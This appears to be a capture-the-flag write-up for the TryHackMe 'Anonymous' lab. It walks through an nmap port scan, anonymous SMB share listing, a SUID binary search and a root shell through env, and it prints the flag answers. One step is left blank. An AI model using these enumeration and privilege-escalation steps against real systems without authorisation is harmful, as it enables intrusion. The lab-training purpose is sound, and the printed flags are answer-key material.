<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/anonymous_Cover.png" alt="Anonymous">
</p>

# [Anonymous](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/anonymous)



## Pwn



1. Enumerate the machine.  How many ports are open?

   We first scan the machine for any open ports with the following command:
   
   ```cmd
   nmap -sV 10.10.147.121
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>4</details>

2. What service is running on port 21?

   This answer can be found in the previous image.

   ><details><summary>Click for answer</summary>ftp</details>

3. What service is running on ports 139 and 445?

   Both these answers can be seen in the previous image above.

   ><details><summary>Click for answer</summary>smb</details>

4. There's a share on the user's computer.  What's it called?

   We can use smbclient to identify the shares available on the target machine.
   
   ```cmd
   smbclient -N //10.10.11.32
   ```
   
   Im missing some images it seems.
   
   To view the contents of this share we can use:
   
   ```cmd
   smbclient -N //10.10.11.32/pics
   ```
   
   ![Smb Share](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Nmap_Smb.png)

   More details [here](https://stawm.design.blog/2020/05/21/anonymous-thm-writeup/)

   ><details><summary>Click for answer</summary>pics</details>

5. user.txt

   

   ><details><summary>Click for answer</summary>90d6f992585815ff991e68748c414740</details>

6. root.txt

   In order for us to gain root on this machine we can look for any binaries which have their SUID bit set. 
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![Shell SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Shel_SUID.png)
   
   We can use GTFOBins to look for any binaries which don't need sudo or a password. From this list we can use `/usr/bin/env`.
   
   ![GTFO](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_GTFO.png)
   
   Now we can use this command to get root access on the machine.
   
   ```cmd
   /usr/bin/env bin/bash -p
   ```
   
   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Root.png)
   
   After a quick check to verify we are indeed root, we can look at the contents of `root.txt`.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/anonymous/pwn_Root_Flag.png)

   ><details><summary>Click for answer</summary>4d930091c31a622a7ed10f27999af363</details>
